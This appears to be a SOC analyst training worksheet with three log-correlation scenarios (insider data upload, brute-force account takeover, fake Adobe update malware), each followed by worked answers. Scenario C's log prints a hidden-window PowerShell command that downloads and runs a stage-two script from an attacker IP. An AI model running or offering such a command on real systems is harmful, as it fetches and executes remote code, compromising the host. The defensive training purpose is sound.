# Scenario Labs — Level 2: Multi-Log Scenarios

**Purpose:** Practice correlating multiple log entries to build a complete picture.
**Difficulty:** Intermediate
**Skills:** Cross-source correlation, pattern recognition, TP/FP with context.

---

## Scenario A — The Suspicious Employee

**Story:** An alert fires for "Unusual file access pattern." You have multiple log sources to investigate.

**Context:** Robert Chen is a database administrator. He works Monday-Friday, 9 AM-6 PM. His normal access includes the company's database servers and the IT department's file shares.

**Log Set:**

Windows Event Log (from File Server):
```
2024-03-15T22:15:01Z EventID 4663 (File Access)
  User: r.chen@company.com
  Object: \\FILESERVER01\HR\Employees\Salaries-2024.xlsx
  Access: Read

2024-03-15T22:15:12Z EventID 4663 (File Access)
  User: r.chen@company.com
  Object: \\FILESERVER01\HR\Employees\PersonnelRecords-2024.xlsx
  Access: Read

2024-03-15T22:15:33Z EventID 4663 (File Access)
  User: r.chen@company.com
  Object: \\FILESERVER01\Finance\Payroll\Q4-2023.xlsx
  Access: Read
  
2024-03-15T22:16:01Z EventID 4663 (File Access)
  User: r.chen@company.com
  Object: \\FILESERVER01\Finance\Banking\Account-Details.docx
  Access: Read
```

Azure AD Sign-In Log:
```
2024-03-15T22:14:45Z
  User: r.chen@company.com
  IP: 192.168.1.89
  Device: LAPTOP-RCHEN (managed, compliant)
  Location: New York (VPN connected)
  MFA: Passed
  Result: Success
```

Proxy Log:
```
2024-03-15T22:16:45Z
  User: r.chen@company.com
  Source: 192.168.1.89
  Action: GET https://drive.google.com/ 200
  
2024-03-15T22:17:03Z
  User: r.chen@company.com
  Source: 192.168.1.89
  Action: POST https://drive.google.com/upload 200
  Bytes Sent: 4,832,442
```

**Questions:**

1. When did this activity occur? Is this within normal working hours for Robert?
2. What files did Robert access? Does he have a business reason to access HR and Finance files?
3. What did the proxy log show after the file access? Is this significant?
4. Is the login legitimate (device, MFA, location)?
5. What is your overall assessment? TP or FP?
6. What are your next steps?

**Analysis:**

1. 10:14-10:17 PM on a Friday. Robert's normal hours are 9 AM-6 PM. This is 4+ hours outside his schedule.

2. Robert is a database administrator — not HR or Finance. He has no business reason to access:
   - HR Salaries
   - HR Personnel Records
   - Finance Payroll
   - Finance Banking information
   This is a clear privilege abuse or unauthorized access pattern.

3. After accessing 4 sensitive HR/Finance files, Robert uploaded 4.8 MB to Google Drive. This is likely the files he just read — data exfiltration to a personal cloud account.

4. The login is legitimate — managed device, MFA passed, VPN connected from New York. This is NOT a compromised account. This appears to be Robert himself doing this.

5. TRUE POSITIVE — Insider threat or policy violation.
   The combination of: off-hours access + unauthorized file categories + immediate upload to personal Google Drive = strong evidence of data theft.

6. Next steps:
   - Preserve all evidence (do not alert Robert yet)
   - Escalate immediately to HR, Legal, and management
   - Obtain a legal hold on all Robert's data and access
   - Check historical access — has this happened before?
   - Suspend Robert's access after legal/HR review
   - Report finding to the CISO

---

## Scenario B — The Midnight Brute Force

**Story:** SIEM alerts on multiple authentication failures. You have 5 minutes to investigate.

**Log Set:**

Azure AD Sign-In Log:
```
2024-03-15T03:00:00Z  emily.johnson@company.com  FAIL  185.220.101.47  Error: 50126
2024-03-15T03:00:01Z  emily.johnson@company.com  FAIL  185.220.101.47  Error: 50126
[...500 more failures over 10 minutes...]
2024-03-15T03:10:22Z  emily.johnson@company.com  SUCCESS  185.220.101.47
```

Post-success Unified Audit Log:
```
2024-03-15T03:10:30Z  New-InboxRule
  User: emily.johnson@company.com
  Rule: "Important Emails"
  Action: Forward to emily.biz.backup@gmail.com
  DeleteOriginal: True

2024-03-15T03:11:00Z  FileDownloaded
  User: emily.johnson@company.com
  Site: /sites/Finance/Confidential
  Count: 23 files in 30 seconds
```

Emily's Normal Baseline (from past 90 days):
- Login times: Monday-Friday, 8 AM - 5 PM EST
- Login location: New York, USA
- Login device: LAPTOP-EJOHNSON (managed)
- No file access to Finance/Confidential
- No personal email interactions

**Questions:**
1. How long did the brute force last? How many attempts?
2. Did it succeed?
3. What did the attacker do immediately after gaining access?
4. How does this compare to Emily's normal behavior?
5. Verdict? Actions?

**Analysis:**
1. 10 minutes, 500+ attempts.
2. Yes — success at 03:10:22.
3. Immediately:
   - Created a forwarding rule (all emails → personal Gmail, deleting originals — surveillance + hiding tracks)
   - Downloaded 23 files from Finance Confidential in 30 seconds
4. Nothing about this matches Emily's baseline:
   - Wrong time (3 AM vs 8-5 PM)
   - Wrong location (185.220.101.47 is not New York)
   - Wrong device (not her managed device)
   - Wrong behavior (Finance files, Gmail forwarding)
5. TRUE POSITIVE — Critical. Account compromise with data exfiltration.
   Actions: Immediately disable Emily's account, invalidate all sessions, delete the inbox forwarding rule, block 185.220.101.47, contact Emily via phone (not email — it's being forwarded to the attacker), determine what the 23 files contained, reset password and re-enroll MFA.

---

## Scenario C — The Software Update or Malware?

**Story:** A regular user's workstation generates unusual activity. You must determine what is happening.

**Context:** Lisa Park is a marketing manager with no technical duties.

**Log Set:**

EDR Process Creation:
```
2024-03-15T11:33:22Z
  User: l.park@company.com
  Parent: explorer.exe
  Process: AdobeUpdate.exe
  Path: C:\Users\lpark\Downloads\AdobeUpdate.exe  ← NOT the real Adobe update path
  Command: AdobeUpdate.exe -silent -update
```

```
2024-03-15T11:33:25Z
  User: SYSTEM  ← Process escalated to SYSTEM!
  Parent: AdobeUpdate.exe
  Process: cmd.exe
  Command: cmd.exe /c powershell.exe -exec bypass -w h -c "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage2.ps1')"
```

DNS Log:
```
2024-03-15T11:33:26Z
  Device: LAPTOP-LPARK
  Query: 185.220.101.47 (direct IP, no DNS query needed)
```

Proxy Log:
```
2024-03-15T11:33:27Z
  Source: 192.168.3.44 (LAPTOP-LPARK)
  User: l.park
  GET http://185.220.101.47/stage2.ps1 200
  Size: 24,832 bytes
  User-Agent: PowerShell/5.1 Windows NT 10.0; Win64; x64
```

Email Security (earlier that morning):
```
2024-03-15T08:11:00Z
  Sender: adobe-updates@adobecloud-service.com  (not adobe.com)
  Recipient: l.park@company.com
  Subject: Adobe Suite Update Available - Action Required
  Attachment: AdobeUpdate.exe  SHA256: b2c3d4e5...
  Detection: Clean (AV missed it)
  DMARC: Fail
```

**Questions:**
1. Is AdobeUpdate.exe a legitimate Adobe update? What are the clues?
2. What privilege escalation occurred?
3. What happened after the privilege escalation?
4. How did the malware arrive?
5. Full analysis and response?

**Analysis:**
1. NOT legitimate. Adobe updates run from %ProgramFiles% or Adobe's specific installation path — NOT from Downloads. Additionally, it came via email from a fake Adobe domain.
2. AdobeUpdate.exe ran as Lisa (regular user), then spawned cmd.exe as SYSTEM — a privilege escalation. The malware exploited a local vulnerability or used a legitimate technique to gain SYSTEM privileges.
3. SYSTEM-level cmd.exe executed PowerShell with bypass, downloading and running a stage2 script from the attacker's server (IEX = Invoke-Expression = download and run immediately).
4. Malware arrived via phishing email disguised as an Adobe update, bypassing email AV.
5. TRUE POSITIVE — Critical. Malware infection with privilege escalation.
   - Isolate LAPTOP-LPARK immediately via EDR
   - Block 185.220.101.47 at firewall
   - Block adobecloud-service.com at email gateway
   - Delete the email from all inboxes (other employees may have received it)
   - Start forensic investigation on LAPTOP-LPARK
   - Check if stage2.ps1 did further damage (lateral movement, data theft, persistence)
   - Hash of AdobeUpdate.exe: submit to threat intelligence
